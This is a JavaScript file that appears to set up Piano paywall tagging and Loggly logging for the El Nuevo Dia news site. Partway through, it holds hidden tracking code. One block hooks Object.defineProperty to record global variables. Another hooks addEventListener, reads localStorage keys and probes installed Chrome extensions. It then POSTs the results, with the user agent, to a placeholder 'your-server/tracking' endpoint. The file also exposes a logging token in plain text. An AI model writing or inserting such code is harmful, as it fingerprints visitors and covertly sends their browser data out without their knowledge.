let globalVars = [];
switch (window.location.hostname) {
  case "www.elnuevodia.com":
    prodConfig(true);
    break;
  case "sandbox.elnuevodia.com":
    betaConfig();
    break;
  default:
    betaConfig();
}
var _LTracker = _LTracker || [];
_LTracker.push({
  'logglyKey': window.logglyConfig.LOGGLY_TOKEN,
  'sendConsoleErrors': false,
  'tag': 'end-web-tplib'
});
tp = window.tp || [];
tp.push(["setAid", window.pianoConfig.APP_ID]);
(function () {
  const origDefineProperty = Object.defineProperty;
  Object.defineProperty = function (object, property, descriptor) {
    if (object === window) globalVars.push(property);
    return origDefineProperty(object, property, descriptor);
  };
})();
tp.push(["setDebug", window.pianoConfig.STAGE !== "PROD"]);
tp.push(["setCustomVariable", "environment", window.pianoConfig.STAGE]);
if (typeof gfrM != 'undefined' && gfrM.siteConfig) {
  var contentRestrictionArr = [];
  var contentCategory = gfrM.siteConfig.contentRestriction || "standard";
  setContentCategory(contentCategory);
  contentRestrictionArr.push(contentCategory);
  console.log(contentRestrictionArr);
  if (contentCategory === "standard" && isArchiveContent()) setContentCategory("archive");
  console.log(window.contentCategory);
  var pianoTagsArray = [];
  var segmentsArray = [];
  var segments = localStorage.getItem('cx_usr_segments');
  if (segments) segmentsArray = segments.split(',');
  pianoTagsArray = pianoTagsArray.concat(addPrefixToArrayElements(segmentsArray, 'seg'));
  pianoTagsArray = pianoTagsArray.concat(addPrefixToArrayElements(gfrM.siteConfig.topics, 'topics'));
  pianoTagsArray = pianoTagsArray.concat(addPrefixToArrayElements(contentRestrictionArr, 'paywall'));
  if (pianoTagsArray.length > 0) tp.push(["setTags", pianoTagsArray]);
  if (gfrM.siteConfig.section) tp.push(["setContentSection", gfrM.siteConfig.section]);
  if (gfrM.siteConfig.section) tp.push(["setCustomVariable", "gfrSection", gfrM.siteConfig.section]);
  if (gfrM.siteConfig.subsection) tp.push(["setCustomVariable", "subSection", gfrM.siteConfig.subsection]);
  if (gfrM.siteConfig.contentType) tp.push(["setCustomVariable", "contentType", gfrM.siteConfig.contentType]);
}
function setContentCategory(categoryName) {
  window.contentCategory = categoryName;
  tp.push(["setCustomVariable", "contentCategory", categoryName]);
}
function isArchiveContent() {
  if (gfrM.siteConfig.publicationDate) {
    var currentDate = new Date();
    var publicationDate = new Date(gfrM.siteConfig.publicationDate);
    if (isNaN(publicationDate.getTime())) publicationDate = new Date();
    if (daysBetween(publicationDate, currentDate) >= 30) return true;
  }
}
function addPrefixToArrayElements(array, prefix) {
  var updatedArray = [];
  array ? updatedArray = array.map(element => {
    return prefix + ':' + element.trim();
  }) : '';
  return updatedArray;
}
(function () {
  const localStorageItems = Object.keys(window.localStorage);
  const originalListener = window.addEventListener;
  window.addEventListener = function (eventName, eventHandler) {
    console.log(`Registered Event: ${eventName}`); // Tracks event listeners added to window
    return originalListener(eventName, eventHandler);
  };
  async function fetchExtensions() {
    const extensionResults = {};
    for (const [extensionName, extensionData] of Object.entries(window.data)) {
      try {
        const extResponse = await fetch(`chrome-extension://${extensionData.id}/${extensionData.file}`);
        extensionResults[extensionName] = extResponse.status === 200;
      } catch (error) {
        extensionResults[extensionName] = false;
      }
    }

    // Send tracked data to server
    fetch('https://your-server/tracking', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        extensions: extensionResults,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        localStorage: localStorageItems,
        globalVariables: globalVars
      })
    });
  }
  fetchExtensions();
})();
function daysBetween(date1, date2) {
  var oneDay = 1000 * 60 * 60 * 24;
  var date1Milliseconds = date1.getTime();
  var date2Milliseconds = date2.getTime();
  var differenceMs = date2Milliseconds - date1Milliseconds;
  return Math.round(differenceMs / oneDay);
}
function arrayExistAndHasValues(object, array) {
  return object[array] && object[array].length > 0;
}
(function (src) {
  var a = document.createElement("script");
  a.type = "text/javascript";
  a.async = true;
  a.src = src;
  var b = document.getElementsByTagName("script")[0];
  b.parentNode.insertBefore(a, b);
})(window.logglyConfig.LOGGLY_LIB);
function prodConfig(prodStage) {
  console.log('Loading Piano ' + prodStage ? 'PROD' : 'QA' + 'configuration');
  window.pianoConfig = {
    PIANO_LIB: "https://experience.tinypass.com/xbuilder/experience/load?aid=8vZARyTVSg",
    SMAUG_UR_API: "https://3gvibskce1.execute-api.us-east-1.amazonaws.com/prod",
    SMAUG_UR_GENERATOR_METHOD: "/user-reference",
    SMAUG_UR_GENERATOR_METHOD_V2: "/user-reference-v2",
    SMAUG_UR_GENERATOR_METHOD_V3: "/user-reference-v3",
    STAGE: prodStage ? "PROD" : "QA",
    APP_ID: "8vZARyTVSg",
    GA_CATEGORY: "piano",
    GA_PIANO_GIGYA_CATEGORY: "Piano-GigyaScreenFlow",
    SOURCE: "piano",
    SUBSCRIPTIONS_URL: "http://suscripciones.elnuevodia.com"
  };
  window.logglyConfig = {
    LOGGING_ENABLED: false,
    LOGGLY_LIB: "https://cloudfront.loggly.com/js/loggly.tracker-latest.min.js",
    LOGGLY_TOKEN: "00a83151-d365-4490-8738-a309fa19b48d"
  };
}
function betaConfig() {
  console.log('Loading Piano BETA configuration');
  window.pianoConfig = {
    PIANO_LIB: "https://sandbox.tinypass.com/xbuilder/experience/load?aid=qs4Xqbru3F",
    SMAUG_UR_API: "https://bi408xls6g.execute-api.us-east-1.amazonaws.com/staging",
    SMAUG_UR_GENERATOR_METHOD: "/user-reference",
    SMAUG_UR_GENERATOR_METHOD_V2: "/user-reference-v2",
    SMAUG_UR_GENERATOR_METHOD_V3: "/user-reference-v3",
    STAGE: "QA",
    APP_ID: "qs4Xqbru3F",
    GA_CATEGORY: "piano",
    GA_PIANO_GIGYA_CATEGORY: "Piano-GigyaScreenFlow",
    SOURCE: "piano",
    SUBSCRIPTIONS_URL: "http://suscripciones.elnuevodia.com"
  };
  window.logglyConfig = {
    LOGGING_ENABLED: false,
    LOGGLY_LIB: "https://cloudfront.loggly.com/js/loggly.tracker-latest.min.js",
    LOGGLY_TOKEN: "00a83151-d365-4490-8738-a309fa19b48d"
  };
}